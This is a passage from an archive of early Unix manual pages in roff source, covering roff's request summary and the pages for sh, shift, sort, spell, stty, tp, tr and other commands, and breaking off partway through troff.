than \fIn\fR.
.s3
.lp +5 5
\fB\*-s\fR	Stop before each page (including the first)
to allow paper manipulation;
resume on receipt of an interrupt signal.
.s3
.lp +5 5
\fB\*-h\fR	Insert tabs in the output stream to replace
spaces whenever appropriate.
.s3
.i0
.dt
Input consists of intermixed
.it "text lines,"
which contain information to be formatted, and
.it "request lines,"
which contain instructions about how to format
it.
Request lines begin with a distinguished
.it "control character,"
normally a period.
.s3
Output lines may be
.it filled
as nearly as possible with words without regard to
input lineation.
Line
.it breaks
may be caused at specified places by
certain commands, or by the appearance of an
empty input line or an input line beginning with a space.
.s3
The capabilities of
.it roff
are specified in the attached Request Summary.
Numerical values are denoted there by n or +n,
titles by t, and single characters by c.
Numbers denoted +n may be signed + or \*-,
in which case they signify relative changes to
a quantity, otherwise they signify
an absolute resetting.
Missing n fields are ordinarily taken to be 1,
missing t fields to be empty, and c fields to shut off
the appropriate special interpretation.
.s3
Running titles usually appear at top and bottom of every
page.
They are set by requests like
.s3
.in +10
.if t \&.he \(fmpart1\(fmpart2\(fmpart3\(fm
.if n \&.he 'part1'part2'part3'
.in -10
.s3
Part1 is left justified, part2 is centered,
and part3 is right justified on the page.
Any % sign in a title is replaced by the current
page number.
Any nonblank may serve as a quote.
.s3
ASCII tab characters are replaced in the input by a
.it "replacement character,"
normally a space,
according to the
column settings given by a .ta command.
(See .tr for how to convert this character on output.)
.s3
Automatic hyphenation of filled output is done
under control of .hy.
When a word contains a designated
.it "hyphenation character,"
that character disappears from the output and
hyphens can be introduced into
the word at the marked places only.
.sh FILES
/usr/lib/suftab	suffix hyphenation tables
.br
/tmp/rtm?	temporary
.br
.sh "SEE ALSO"
nroff (I), troff (I)
.sh BUGS
.it Roff
is the simplest of the runoff
programs, but is utterly frozen.
.bp
.tc |
.tr |
.in 0
.ce
REQUEST SUMMARY
.s3
.ul
.if t .ta .75i 1.5i 2.25i
.if n .ta 9 17 25 33
Request	Break	Initial	Meaning
.if t .in2.25i
.if n .in24
.na
.ti 0
.li
.ad	yes	yes	Begin adjusting right margins.
.ti 0
.li
.ar	no	arabic	Arabic page numbers.
.ti 0
.li
.br	yes	-	Causes a line break \*- the filling of
the current line is stopped.
.ti 0
.li
.bl|n	yes	-	Insert of n blank lines, on new page if necessary.
.ti 0
.li
.bp|+n	yes	n=1	Begin new page and number it n; no n means `+1'.
.ti 0
.li
.cc|c	no	c=.	Control character becomes `c'.
.ti 0
.li
.ce|n	yes	-	Center the next n input lines,
without filling.
.ti 0
.li
.de|xx	no	-	Define parameterless macro 
to be invoked by request `.xx'
(definition ends on line beginning `\fB..\fR').
.ti 0
.li
.ds	yes	no	Double space; same as `.ls 2'.
.ti 0
.li
.ef|t	no	t=\*a\*a\*a\*a	Even foot title becomes t.
.ti 0
.li
.eh|t	no	t=\*a\*a\*a\*a	Even head title becomes t.
.ti 0
.li
.fi	yes	yes	Begin filling output lines.
.ti 0
.li
.fo	no	t=\*a\*a\*a\*a	All foot titles are t.
.ti 0
.li
.hc|c	no	none	Hyphenation character becomes `c'.
.ti 0
.li
.he|t	no	t=\*a\*a\*a\*a	All head titles are t.
.ti 0
.li
.hx	no	-	Title lines are suppressed.
.ti 0
.li
.hy|n	no	n=1	Hyphenation is done, if n=1;
and is not done, if n=0.
.ti 0
.li
.ig	no	-	Ignore input lines through
a line beginning with `\fB..\fR'.
.ti 0
.li
.in|+n	yes	-	Indent n spaces from left margin.
.ti 0
.li
.ix +n	no	-	Same as `.in' but without break.
.ti 0
.li
.li|n	no	-	Literal, treat next n lines as text.
.ti 0
.li
.ll|+n	no	n=65	Line length including indent is n characters.
.ti 0
.li
.ls|+n	yes	n=1	Line spacing set to n lines per output line.
.ti 0
.li
.m1|n	no	n=2	Put n blank lines between the top
of page and head title.
.ti 0
.li
.m2|n	no	n=2	n blank lines put between head title
and beginning of text on page.
.ti 0
.li
.m3|n	no	n=1	n blank lines put between end of
text and foot title.
.ti 0
.li
.m4|n	no	n=3	n blank lines put between the foot title
and the bottom of page.
.ti 0
.li
.na	yes	no	Stop adjusting the right margin.
.ti 0
.li
.ne|n	no	-	Begin new page, if n output lines
cannot fit on present page.
.ti 0
.li
.nn|+n	no	-	The next n output lines are not numbered.
.ti 0
.li
.n1	no	no	Add 5 to page offset;
number lines in margin from 1 on each page.
.ti 0
.li
.n2|n	no	no	Add 5 to page offset;
number lines from n;
stop if n=0.
.ti 0
.li
.ni|+n	no	n=0	Line numbers are indented n.
.ti 0
.li
.nf	yes	no	Stop filling output lines.
.ti 0
.li
.nx|filename	-	Change to input file `filename'.
.ti 0
.li
.of|t	no	t=\*a\*a\*a\*a	Odd foot title becomes t.
.ti 0
.li
.oh|t	no	t=\*a\*a\*a\*a	Odd head title becomes t.
.ti 0
.li
.pa|+n	yes	n=1	Same as `.bp'.
.ti 0
.li
.pl|+n	no	n=66	Total paper length taken to be n lines.
.ti 0
.li
.po|+n	no	n=0	Page offset.
All lines are preceded by n spaces.
.ti 0
.li
.ro	no	arabic	Roman page numbers.
.ti 0
.li
.sk|n	no	-	Produce n blank pages starting next page.
.ti 0
.li
.sp|n	yes	-	Insert block of n blank lines,
except at top of page.
.ti 0
.li
.ss	yes	yes	Single space output lines,
equivalent to `.ls 1'.
.ti 0
.li
.ta|n|n..		-	Pseudotab settings.
Initial tab settings are columns 9 17 25 ...
.ti 0
.li
.tc|c	no	space	Tab replacement character becomes `c'.
.ti 0
.li
.ti|+n	yes	-	Temporarily indent next output
line n spaces.
.ti0
.li
.tr|cdef..	no	-	Translate c into d, e into f, etc.
.ti0
.li
.ul|n	no	-	Underline the letters and numbers
in the next n input lines.
-- /usr/man/man1/sh.1 mode=0110664 uid=3 gid=3 atime=170022180 mtime=173061354 --
.th SH I 5/15/74
.sh NAME
sh  \*-  shell (command interpreter)
.sh SYNOPSIS
.bd sh
[
.bd \*-t
] [
.bd \*-c
]
[ name [ arg1 ... [ arg9 ] ] ]
.sh DESCRIPTION
.it Sh
is the standard command interpreter.
It is the program which reads and arranges the execution of
the command lines typed by most users.
It may itself be called as a command to interpret
files of commands.
Before discussing the arguments to the Shell
used as a command, the structure of command
lines themselves will be given.
.s3
.bd "Commands."
Each command is a sequence of non-blank command arguments
separated by blanks.
The
first argument specifies the name of a command to be
executed.
Except for certain types of special
arguments discussed below, the arguments
other than the command name are passed
without interpretation to the invoked
command.
.s3
If the first argument is the name of an executable
file, it is invoked;
otherwise the string `/bin/' is prepended to the argument.
(In this way most standard commands,
which reside in `/bin', are found.)
If no such command is found,
the string `/usr' is further prepended
(to give `/usr/bin/command') and another attempt
is made to execute the resulting
file.
(Certain lesser-used commands
live in `/usr/bin'.)
.s3
If a non-directory file has executable mode,
but not the form of an executable program
(does not begin with the proper magic number)
then it is assumed to be an ASCII file of commands
and a new Shell is created to execute it.
See ``Argument passing'' below.
.s3
If the file cannot be found,
a diagnostic is printed.
.s3
.bd "Command lines."
One or more commands separated by `|' or `^' constitute a
chain of
.it filters.
The standard output of each command but the last
is taken
as the standard input of the next command.
Each command is run as a separate process, connected
by pipes (see pipe(II)) to its neighbors.
A command line contained in
parentheses `( )' may appear in place of a simple command
as a filter.
.s3
A
.it "command line"
consists of one or
more pipelines separated, and perhaps terminated by `\fB;\fR' or `&'.
The semicolon designates sequential execution.
The ampersand causes the preceding pipeline to be executed
without waiting for it to finish.
The process id of such a pipeline is reported, so that
it may be used if necessary for a subsequent
.it wait
or
.it kill.
.s3
.bd "Termination Reporting."
If a command (not followed by `&') terminates abnormally,
a message is printed.
(All terminations other than exit and interrupt
are considered abnormal.)
Termination reports for commands followed by `&'
are given upon receipt of the first
command subsequent to the termination of
the command,
or when a
.it wait
is executed.
The following is a list of the abnormal
termination messages:
.s3
.nf
	Bus error
	Trace/BPT trap
	Illegal instruction
	IOT trap
	EMT trap
	Bad system call
	Quit
	Floating exception
	Memory violation
	Killed
	Broken Pipe
.s3
.fi
If a core image is produced,
`\*- Core dumped' is appended to the appropriate message.
.s3
.bd "Redirection of I/O."
There are three character sequences that cause the immediately following string
to be interpreted as a special argument to the Shell itself.
Such an argument may
appear anywhere among
the arguments of a simple command, or before or after
a parenthesized command list, and is associated with that
command or command list.
.s3
An argument of the form `<arg' causes the file
`arg'
to be used as the standard input (file descriptor 0) of the associated command.
.s3
An argument of the form `>arg' causes file `arg' to be used
as the standard output (file descriptor 1) for the associated command.
`Arg' is created if it did not exist, and in any case is truncated
at the outset.
.s3
An argument of the form `>>arg' causes file `arg' to be used as the
standard output for the associated command.
If `arg'
did not exist, it is created; if it did exist,
the command output is appended to the file.
.s3
For example, either of the command lines
.s3
	ls >junk; cat tail >>junk
.br
	( ls; cat tail ) >junk
.s3
creates, on file `junk', a listing of the working directory, followed immediately
by the contents of file `tail'.
.s3
Either of the constructs `>arg' or `>>arg'
associated with any but the last command of a pipeline
is ineffectual, as is `<arg' in any but the first.
.s3
In commands called by the Shell,
file descriptor 2 refers to the standard output of the
Shell before any redirection.
Thus filters may write diagnostics
to a location
where they have a chance to be seen.
.s3
.bd "Generation of argument lists."
If any argument contains any of the characters `?',
`*' or `[', it is treated specially as follows.
The current directory is searched for files which
.it match
the given argument.
.s3
The character `*' in an argument matches any string of characters
in a file name (including the null string).
.s3
The character `?' matches any
single character in a file name.
.s3
Square brackets `[...]' specify
a class of characters which
matches any single file-name character in the class.
Within the brackets,
each ordinary character is taken
to be a member of the class.
A pair of characters separated by `\*-' places
in the class
each character lexically greater than or equal to
the first and less than or equal to the second
member of the pair.
.s3
Other characters match only the same character in
the file name.
.s3
For example, `*' matches all file names;
`?' matches all one-character file names; `[ab]*.s' matches
all file names beginning with `a' or `b' and ending with `.s';
`?[zi\*-m]' matches all two-character file names ending
with `z' or the letters `i' through `m'.
.s3
If the argument with `*' or `?' also contains a `/', a slightly
different procedure is used:  instead of the current directory,
the directory used is the one obtained
by taking the argument up to the last `/' before a `*' or `?'.
The matching process matches the remainder of the argument
after this `/' against the files in the derived directory.
For example: `/usr/dmr/a*.s' matches
all files in directory `/usr/dmr' which begin
with `a' and end with `.s'.
.s3
In any event, a list of names is obtained which match
the argument.
This list is sorted into alphabetical order,
and the resulting sequence of arguments replaces the
single argument containing the `*', `[', or `?'.
The same process is carried out for each argument
(the resulting lists are
.it not
merged)
and finally the command is called with the resulting list of
arguments.
.s3
.bd "Quoting."
The character `\\' causes the immediately following character
to lose any special meaning it may have to the Shell;  in this
way `<', `>', and other characters meaningful to the
Shell may be passed as part of arguments.
A special case of this feature allows the continuation of commands
onto more than one line:  a new-line preceded by `\\' is translated
into a blank.
.s3
Sequences of characters enclosed in double (") or single (\*a)
quotes are also taken literally.
For example:
.s3
	ls  |  pr \*-h "My directory"
.s3
causes a directory listing to be produced
by
.it ls,
and passed on to
.it pr
to be
printed with the heading `My directory'.
Quotes permit the inclusion of blanks in
the heading, which is a single argument to
.it pr.
.s3
.bd "Argument passing."
When the Shell is invoked as a command, it has additional
string processing capabilities.
Recall that the form in which the Shell is invoked is
.s3
	sh [ name [ arg1 ... [ arg9 ] ] ]
.s3
The
.it name
is the name of a file which is read and
interpreted.
If not given, this subinstance of the Shell
continues to read the standard input file.
.s3
In command lines in the file
(not in command input),
character sequences of the form `$n', where
.it n
is a digit,
are replaced by the
\fIn\fRth argument to the invocation
of the Shell (argn).
`$0' is replaced by
.it name.
.s3
The argument `\*-t,' used alone, causes
.it sh
to read the standard input for a single line, execute
it as a command, and then exit.
This facility replaces the older `mini-shell.'
It is useful for interactive programs
which allow users to execute
system commands.
.s3
The argument `\*-c' (used with one following argument)
causes the next argument to be taken as a command
line and executed.
No new-line need be present, but new-line characters
are treated appropriately.
This facility is useful as an alternative to
`\*-t' where the caller has already read
some of the characters of the command to be executed.
.s3
.bd "End of file."
An end-of-file in the Shell's input causes it to exit.
A side effect of this fact means that the way to
log out from UNIX is to type an EOT.
.s3
.bd "Special commands."
The following commands are treated specially by the Shell.
.s3
.it chdir
is done without
spawning a new process by executing
.it "sys chdir"
(II).
.s3
.it login
is done by executing
/bin/login without creating a new process.
.s3
.it wait
is done without spawning a new process by
executing
.it "sys wait"
(II).
.s3
.it shift
is done by manipulating the arguments
to the Shell.
.s3
`\fB:\fR' is simply ignored.
.s3
.bd "Command file errors; interrupts."
Any Shell-detected error, or an interrupt signal,
during the execution of a command file
causes the Shell to cease execution of that file.
.s3
Processes that are created with `&' ignore interrupts.
Also if such a process has not redirected its
input with a `<',
its input is automatically redirected to the
zero length file /dev/null.
.sh FILES
/etc/glob,
which interprets `*', `?', and `['.
.br
/dev/null as a source of end-of-file.
.sh "SEE ALSO"
`The UNIX Time-Sharing System',
CACM, July, 1974,
which gives the theory of operation of the
Shell.
.br
chdir (I), login (I), wait (I), shift (I)
.sh BUGS
There is no way to redirect the diagnostic output.
-- /usr/man/man1/shift.1 mode=0100664 uid=3 gid=3 atime=170022181 mtime=173061354 --
.th SHIFT I 8/21/73
.sh NAME
shift \*- adjust Shell arguments
.sh SYNOPSIS
.bd shift
.sh DESCRIPTION
.it Shift
is used in Shell command files to shift the
argument list left by 1,
so that old
.bd $2
can now be referred to by
.bd $1
and so forth.
.it Shift
is useful to iterate over several arguments
to a command file.
For example, the command file
.s3
.lp +5 0
: loop
.br
if $1x = x exit
.br
pr \*-3 $1
.br
shift
.br
goto loop
.s3
.i0
prints each of its arguments in 3-column format.
.s3
.it Shift
is executed within the Shell.
.sh "SEE ALSO"
sh (I)
.sh BUGS
-- /usr/man/man1/size.1 mode=0100664 uid=3 gid=3 atime=170022181 mtime=173061354 --
.th SIZE I 9/2/72
.sh NAME
size \*- size of an object file
.sh SYNOPSIS
.bd size
[ object ... ]
.sh DESCRIPTION
.it Size
prints the (decimal) number of bytes
required by the
text, data, and bss
portions, and their sum in octal and decimal,
of each object-file argument.
If no file is specified,
.bd a.out
is used.
.sh BUGS
-- /usr/man/man1/sleep.1 mode=0100664 uid=3 gid=3 atime=170022182 mtime=173061354 --
.th SLEEP I 11/1/73
.sh NAME
sleep \*- suspend execution for an interval
.sh SYNOPSIS
.bd sleep
time
.sh DESCRIPTION
.it Sleep
suspends execution for
.it time
seconds.
It is used to execute a command
in a certain amount of time as in:
.s3
	(sleep 105; command)&
.s3
Or to execute a command every so often as in
this shell command file:
.s3
	: loop
.br
	command
.br
	sleep 37
.br
	goto loop
.sh "SEE ALSO"
sleep (II)
.sh BUGS
.it Time
must be less than 65536 seconds.
-- /usr/man/man1/sort.1 mode=0100664 uid=3 gid=3 atime=170022183 mtime=173061354 --
.th "SORT" I 5/13/75
.sh NAME
sort, usort \*- sort or merge files
.sh SYNOPSIS
.bd sort
[
.if t \fB\*-abdnrt\fIx\fR
.if n -abdnrt______x
]
[ \fB+\fIpos \fR [ \fB\*-\fIpos \fR]
] . . .
[ 
.bd \*-mo 
]
[ name ] . . .
.br
.bd usort
[
.bd \-umo
] [ name ] . . .
.sh DESCRIPTION
.it Sort
sorts
all the named files together
and writes the result on
the standard output.
The name `\*-' means
the standard input.
The standard input is also used if no input file names are given.
Thus
.it sort
may be used as a filter.
.s3
The default sort key is an entire line.
Default ordering is lexicographic in ASCII collating sequence,
except that lower-case letters are considered
the same as the corresponding upper-case letters.
Non-ASCII bytes are ignored.
The ordering is affected by the flags
.if t \fB\*-abdnrt\fR,
.if n .it abdnrt,
one or more of which may appear:
.s3
.lp +4 4
\fBa\fR	Do not map lower case letters.
.s3
.lp +4 4
\fBb\fR	Leading blanks (spaces and tabs) are not included in fields.
.s3
.lp+4 4
\fBd\fR	`Dictionary' order: only letters, digits and blanks
are significant in ASCII comparisons.
.s3
.lp +4 4
\fBn\fR	An initial numeric string,
consisting of optional minus sign,
digits and optionally included decimal point,
is sorted by arithmetic value.
.s3
.lp+4 4
\fBr\fR	Reverse the sense of comparisons.
.s3
.lp +4 4
\fBt\fIx\fR	Tab character between fields is
.it x.
.s3
.i0
Selected parts of the line, specified by
\fB+\fIpos\fR
and
\fB\*-\fIpos\fR,
may be used as sort keys.
.it Pos 
has the form
.it m.n,
where
.it m
specifies a number of fields to skip,
and 
.it n
a number of characters to skip further into the next field.
A missing
.it \\.n
is taken to be 0.
\fB+\fIpos\fR denotes the beginning of the key;
\fB\*-\fIpos\fR denotes the first position after the key
(end of line by default).
The ordering rule may be overridden for a particular key
by appending one or more of the flags
.bd abdnr
to
\fB+\fIpos\fR.
.s3
When no tab character has been specified,
a field consists of
nonblanks and any preceding blanks.
Under the
.bd \*-b
flag, leading blanks are excluded from a field.
When a tab character has been specified,
a field is a
string ending with a tab character.
.s3
.i0
When keys are specified,
later keys are compared only when all earlier ones compare equal.
Lines that compare equal are ordered
with all bytes significant.
.s3
These flag arguments are also understood:
.s3
.lp +4 4
\fB\*-m\fR	Merge only, the input files are already sorted.
.s3
.lp +4 4
\fB\*-o\fR	The next argument is the name of an output file
to use instead of the standard output.
This file may be the same as one of the inputs,
except under the merge flag \fB\*-m\fR.
.i0
.s3
.it Usort
is a somewhat specialized version of
.it sort
which accepts no collating sequence options:
order is always
plain ASCII.
It also strips out the second and following copies
of duplicated lines.
A
.it u
flag prevents this stripping.
.it Usort
also understands
the
.it m
and
.it o
options in the same way as
.it sort.
.sh FILES
/usr/tmp/stm???
.sh BUGS
-- /usr/man/man1/spell.1 mode=0100664 uid=3 gid=3 atime=170022184 mtime=173061354 --
.th SPELL I 4/15/75
.sh NAME
spell \*- find spelling errors
.sh SYNOPSIS
.bd spell
[
.bd \*-v
]
file ...
.sh DESCRIPTION
.it Spell
collects the words from the named documents,
and looks them up in a dictionary.
The words not found are printed on the standard output.
Words which are reasonable transformations of dictionary entries
(e.g. a dictionary entry plus
.it s
)
are not printed.
If no files are given, the input is from the standard input.
.s3
If the
.bd \*-v
flag is given, all words which are not literally in the dictionary are printed;
those which can be transformed to lie in the dictionary are so marked,
and the others are marked with asterisks.
.s3
The process takes several minutes.
.sh FILES
/usr/lib/w2006, /usr/dict/words, /usr/lib/spell[123]
.sh "SEE ALSO"
typo (I)
.sh BUGS
.s3
Because of the mapping into lower case and the stripping of
special characters, words may be hard to locate in the original text.
.s3
The escape sequences of troff (I) are not correctly recognized.
.s3
More suffixes, and perhaps some prefixes, should be added.
.s3
The dictionary cannot be distributed because of
copyright limitations.
-- /usr/man/man1/split.1 mode=0100664 uid=3 gid=3 atime=170022186 mtime=173061354 --
.th SPLIT I 1/15/73
.sh NAME
split \*- split a file into pieces
.sh SYNOPSIS
.bd split
.bd \*-\fIn
[ file [ name ] ]
.sh DESCRIPTION
.it Split
reads
.it file
and writes
it in
\fIn\fR-line
pieces
(default 1000), as many as necessary,
onto
a set of output files.  The name of the first output
file is
.it name
with
.bd aa
appended, and so on
lexicographically.
If no output name is given,
.bd x
is default.
.s3
If no input file is given, or
if
.bd \*-
is given in its stead,
then the standard input file is used.
.sh BUGS
-- /usr/man/man1/strip.1 mode=0100664 uid=3 gid=3 atime=170022188 mtime=173061354 --
.th STRIP I 3/15/72
.sh NAME
strip  \*-  remove symbols and relocation bits
.sh SYNOPSIS
.bd strip
name ...
.sh DESCRIPTION
.it Strip
removes the symbol
table and relocation bits ordinarily attached to the output
of the assembler and loader.
This is useful to save space after a program has been
debugged.
.s3
The effect of
.it strip
is the the same as use of the
.bd \*-s
option
of
.it ld.
.sh FILES
/tmp/stm?	temporary file
.sh "SEE ALSO"
ld (I), as (I)
.sh BUGS
-- /usr/man/man1/stty.1 mode=0100664 uid=3 gid=3 atime=170022189 mtime=173061354 --
.th STTY I 6/12/72
.sh NAME
stty \*- set typewriter options
.sh SYNOPSIS
.bd stty
[ option ... ]
.sh DESCRIPTION
.it Stty
sets certain I/O options on the current output typewriter.
With no argument, it reports the current settings of the options.
The option strings are
selected from the following set:
.s3
.lp +10 10
\fBeven\fR	allow even parity
.lp +10 10
\fB\*-even\fR	disallow even parity
.lp +10 10
\fBodd\fR	allow odd parity
.lp +10 10
\fB\*-odd\fR	disallow odd parity
.lp +10 10
\fBraw\fR	raw mode input
(no erase, kill, interrupt, quit, EOT; parity bit passed back)
.lp +10 10
\fB\*-raw\fR	negate raw mode
.lp +10 10
\fBcooked\fR	same as `\-raw'
.lp +10 10
\fB\*-nl\fR	allow carriage return for new-line,
and output CR-LF for carriage return or new-line
.lp +10 10
\fBnl\fR	accept only new-line to end lines
.lp +10 10
\fBecho\fR	echo back every character typed
.lp +10 10
\fB\*-echo\fR	do not echo characters
.lp +10 10
\fBlcase\fR	map upper case to lower case
.lp +10 10
\fB\*-lcase\fR	do not map case
.lp +10 10
\fB\*-tabs\fR	replace tabs by spaces when printing
.lp +10 10
\fBtabs\fR	preserve tabs
.lp +10 10
\fBek\fR	reset erase and kill characters back to normal # and @.
.lp +10 10
\fBerase\fI c\fR	set erase character to
.it c.
.lp +10 10
\fBkill\fI c\fR	set kill character to
.it c.
.lp +10 10
\fBcr0 cr1 cr2 cr3\fR
.br
select style of delay for carriage return (see below)
.lp +10 10
\fBnl0 nl1 nl2 nl3\fR
.br
select style of delay for linefeed (see below)
.lp +10 10
\fBtab0 tab1 tab2 tab3\fR
.br
select style of delay for tab (see below)
.lp +10 10
\fBff0 ff1\fR
.br
select style of delay for form feed (see below)
.lp +10 10
\fBtty33\fR	set all modes suitable for Teletype model 33
.lp +10 10
\fBtty37\fR	set all modes suitable for Teletype model 37
.lp +10 10
\fBvt05\fR	set all modes suitable for DEC VT05 terminal
.lp +10 10
\fBtn300\fR	set all modes suitable for GE Terminet 300
.lp +10 10
\fBti700\fR	set all modes suitable for Texas Instruments 700 terminal
.lp +10 10
\fBtek\fR	set all modes suitable for Tektronix 4014 terminal
.lp +10 10
\fBhup\fR	hang up dataphone on last close.
.lp +10 10
\fB\-hup\fR	do not hang up dataphone on last close.
.lp +10 10
\fB0\fR	hang up phone line immediately
.lp +10 10
\fB50 75 110 134 150 200 300 600 1200 1800 2400 4800 9600 exta extb\fR
.br
Set typewriter baud rate to the number given, if possible.
(These are the speeds supported by the DH-11 interface).
.s3
.i0
.dt
The various delay algorithms are tuned to various kinds of terminals.
In general the specifications ending in `0' mean no delay for the
corresponding character.
.sh "SEE ALSO"
stty (II)
.sh BUGS
-- /usr/man/man1/tee.1 mode=0100664 uid=3 gid=3 atime=170022190 mtime=173061354 --
.th TEE I 3/6/74
.sh NAME
tee \*- pipe fitting
.sh SYNOPSIS
.bd tee
[ name ... ]
.sh DESCRIPTION
.it Tee
transcribes the standard input to the standard
output and makes copies in the named files.
.sh BUGS
-- /usr/man/man1/time.1 mode=0100664 uid=3 gid=3 atime=170022190 mtime=173061354 --
.th TIME I 8/16/73
.sh NAME
time \*- time a command
.sh SYNOPSIS
.bd time
command
.sh DESCRIPTION
The
given command is executed; after it is complete,
.it time
prints the elapsed time during the command, the time
spent in the system, and the time spent in execution
of the command.
.s3
The execution time can depend on what kind of memory
the program happens to land in;
the user time in MOS is often half what it is in core.
.s3
The times are printed on the diagnostic output stream.
.sh BUGS
Elapsed time is accurate to the second,
while the CPU times are measured
to the 60th second.
Thus the sum of the CPU times can be up to a second larger
than the elapsed time.
-- /usr/man/man1/tp.1 mode=0100664 uid=3 gid=3 atime=170022192 mtime=173061354 --
.th TP I 10/15/73
.sh NAME
tp  \*-  manipulate DECtape and magtape
.sh SYNOPSIS
.bd tp
[ key ] [ name ... ]
.sh DESCRIPTION
.it Tp
saves and restores files
on DECtape or magtape.
Its actions are controlled by the
.it key
argument.
The key is a string of characters containing
at most one function letter and possibly
one or more function modifiers.
Other arguments to the command are file or directory
names specifying which files are to be dumped, restored,
or listed.
In all cases, appearance of a directory name refers to
the files and (recursively) subdirectories of that directory.
.s3
The function portion of
the key is specified by one of the following letters:
.s3
.lp +8 4
\fBr\fR	The named files
are written
on the tape.
If files with the same names
already exist, they are replaced.
`Same' is determined by string comparison, so
`./abc' can never be the same as `/usr/dmr/abc' even
if `/usr/dmr' is the current directory.
If no file argument is given, `\fB.\fR' is the default.
.s3
.lp +8 4
\fBu\fR	updates the tape.
.bd u
is like
.bd r,
but a file is replaced only if its
modification date is later than the date stored on the tape;
that is to say, if it has changed since it was dumped.
.bd u
is the default command if none is given.
.s3
.lp +8 4
\fBd\fR	deletes the named files from
the tape.
At least one name argument must be given.
This function is not permitted on magtapes.
.s3
.lp +8 4
\fBx\fR	extracts the named files from the tape to the file system.
The owner and mode are restored.
If no file argument is given, the entire contents of the
tape are extracted.
.s3
.lp +8 4
\fBt\fR	lists the names of the specified files.
If no file argument is given,
the entire contents of the tape is listed.
.s3
.i0
The following characters may be used in addition to the letter
which selects the function desired.
.s3
.lp +10 6
\fBm\fR	Specifies magtape as opposed to DECtape.
.s3
.lp +10 6
\fB0,...,7\fR	This
modifier selects the drive on which the tape is mounted.
For DECtape, `x' is default; for magtape
`0' is the default.
.s3
.lp +10 6
\fBv\fR	Normally
.it tp
does its work silently.
The
.bd v
(verbose)
option causes it to type the name of each file it treats
preceded by the function letter.
With the
.bd t
function,
.bd v
gives more information about the
tape entries than just the name.
.s3
.lp +10 6
\fBc\fR	means a fresh dump is being created; the tape directory
is zeroed before beginning.
Usable only with
.bd r
and
.bd u.
This option is assumed with magtape since
it is impossible to selectively overwrite
magtape.
.s3
.lp +10 6
\fBf\fR	causes new entries on tape to be `fake' in that
no data is present for these entries.
Such fake entries cannot be extracted.
Usable only with
.bd r
and
.bd u.
.s3
.lp +10 6
\fBi\fR	Errors reading and writing the
tape are noted, but no action is taken.
Normally, errors cause a return to the command level.
.s3
.lp +10 6
\fBw\fR	causes
.it tp
to pause before treating each file, type
the indicative letter and the file name (as with v)
and await the user's response.
Response
.bd y
means `yes', so the file is treated.
Null response
means `no', and the file does not take part
in whatever is being done.
Response
.bd x
means `exit';
the
.it tp
command terminates immediately.
In the
.bd x
function,
files previously asked about
have been extracted already.
With
.bd "r, u,"
and
.bd d
no change has been made to the tape.
.s3
.i0
.sh FILES
/dev/tap?
.br
/dev/mt?
.sh DIAGNOSTICS
Several; the non-obvious one is
`Phase error', which means the file changed after it was selected for
dumping but before it was dumped.
.sh BUGS
A single file with several links to it is treated like several files.
-- /usr/man/man1/tr.1 mode=0100664 uid=3 gid=3 atime=170022194 mtime=173061354 --
.th TR I 5/20/74
.sh NAME
tr \*- transliterate
.sh SYNOPSIS
.bd tr
[
.bd \*-cds
] [ string1 [ string2 ] ]
.sh DESCRIPTION
.it Tr
copies the standard input to the standard output with 
substitution or deletion of selected characters.
Input characters found in 
.it string1
are mapped into the corresponding characters of
.it string2.
Any combination of the options
.bd \*-cds
may be used.
.bd \*-c
complements the set of characters in
.it string1
with respect to the universe of characters
whose ascii codes are 001 through 377 octal.
.bd \*-d
deletes all input characters in
.it string1.
.bd \*-s
squeezes all strings of repeated output characters that are
in 
.it string2
to single characters.
.s3
The following abbreviation conventions may be used
to introduce ranges of characters or repeated characters into
the strings:
.s3
\fB[\fIa\*|\fB\*-\fIb\fB\*|]\fR
stands for the string of characters whose ascii codes run
from character
.it a
to character
.it b.
.s3
\fB[\fIa\fB\*|*\fIn\fB\*|]\fR,
where
.it n
is an integer or empty, stands for \fIn\fR-fold 
repetition of character
.it a.
.it n
is taken to be octal or decimal according as its
first digit is or is not zero.
A zero or missing
.it n
is taken to be huge;
this facility is useful for padding
.it string2.
.s3
The escape character `\\' may be used as in
.it sh
to remove special meaning from any character in a string.
In addition,
`\\' followed by 1, 2 or 3 octal digits stands for the
character whose ascii code is given by those digits.
.s3
The following example creates a list of all
the words in `file1' one per line in `file2',
where a word is taken to be a maximal string of alphabetics.
The strings are quoted
to protect the special characters from interpretation by the Shell;
012 is the ascii code for newline.
.s3
.ti +8
tr \*-cs "[A\*-Z][a\*-z]" "[\\012*]" <file1 >file2
.sh "SEE ALSO"
sh (I), ed (I), ascii (V)
.sh BUGS
Won't handle ascii NUL in
.it string1
or
.it string2;
always deletes NUL from input.
-- /usr/man/man1/troff.1 mode=0100664 uid=3 gid=3 atime=170022195 mtime=173061354 --
.tc |
.tr |
.th TROFF I 4/15/75
.sh NAME
troff  \*-  format text
.sh SYNOPSIS
.bd troff
[ \fB+\fIn\fR ] [ \fB\*-\fIn\fR ] [
\fB\-s\fIn\fR ] [
\fB\-n\fIn\fR
] [
\fB\-r\fIan\fR
] [
\fB\-m\fIname\fR
] [
.bd \*-t
] [
.bd \*-f
] [
.bd \*-w
] [
.bd \*-a
] [
\fB\-p\fIn\fR
] files
.sh DESCRIPTION
.it Troff
formats text for a Graphic Systems phototypesetter
according to control lines embedded
in the text files.
It reads the standard input if
no file
arguments are given.
An argument of just ``\-'' refers to the standard input.
The non-file option arguments are interpreted as follows:
.s3
.lp +10 10
\fB+\fIn\fR	Commence
typesetting at the first page numbered \fIn\fR or larger.
.s3
.lp +10 10
\fB\*-\fIn\fR	Stop
after page
.it n.
.s3
.lp +10 10
\fB\-s\fIn\fR	Print output
in groups of
.it n
pages,
stopping the typesetter after each group.
.s3
.lp +10 10
\fB\-n\fIn\fR	First generated (not necessarily printed)
page is given the number \fIn;\fR
simulates ``.pn|\fIn\fR''.
.s3
.lp +10 10
\fB\-r\fIan\fR	Set
number register
.it a
to the value
.it n.
.s3
.lp +10 10
\fB\-m\fIname\fR	Prepends a standard macro file;
simulates ``.so /usr/lib/tmac.\fIname\fR''.
.s3
.lp +10 10
\fB\*-t\fR	Place output
on standard output instead
of the phototypesetter.
.s3
.lp +10 10
\fB\*-f\fR	Refrain
from feeding out paper and stopping the phototypesetter
at the end.
.s3
.lp +10 10
\fB\*-w\fR	Wait
until phototypesetter is available, if currently busy.
.s3
.lp +10 10
\fB\*-a\fR	Send a printable
approximation
of the results to the standard output.
.s3
.lp +10 10
\fB\-p\fIn\fR	Print all characters
with point-size \fIn\fR while
retaining all prescribed spacings and motions.
.s3
.i0
.sh FILES
.dt
/usr/lib/suftab	suffix hyphenation tables
.br
